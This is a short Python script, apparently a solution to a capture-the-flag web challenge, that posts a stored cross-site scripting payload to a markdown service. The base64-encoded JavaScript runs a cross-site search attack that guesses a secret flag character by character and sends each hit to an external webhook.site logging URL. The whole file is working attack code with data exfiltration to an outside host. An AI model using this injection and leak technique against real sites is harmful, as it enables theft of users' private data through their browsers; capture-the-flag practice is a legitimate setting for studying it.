import httpx
import base64

payload = """
const targetUrl = "https://wwwwwwwwaas.web.actf.co";
const logUrl = "https://webhook.site/8cda91cf-9e4b-4ed8-8655-11770f30a4ec";
function log(msg) {
    navigator.sendBeacon(logUrl + '/log?f=' + msg);
}
function probeError(query) {
    let script = document.createElement('script');
    script.src = targetUrl + '/search?q=' + encodeURIComponent(query);
    script.onload = () => {
        log(query);
        check(query);
    };
    document.head.appendChild(script);
}
const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}';
function check(flag) {
    for (let i = 0; i < charset.length; i++) {
        let c = charset[i];
        let query = flag + c;
        probeError(query);
    }
}
check("actf{");
"""
payload = base64.b64encode(payload.encode()).decode()


def main() -> None:
    with httpx.Client(base_url="https://markdown.web.actf.co") as client:
        r = client.post(
            "/create",
            data={"content": f"<img src=x onerror='eval(atob(`{payload}`))'>"},
            follow_redirects=True,
        )

        print(r.url)


if __name__ == "__main__":
    main()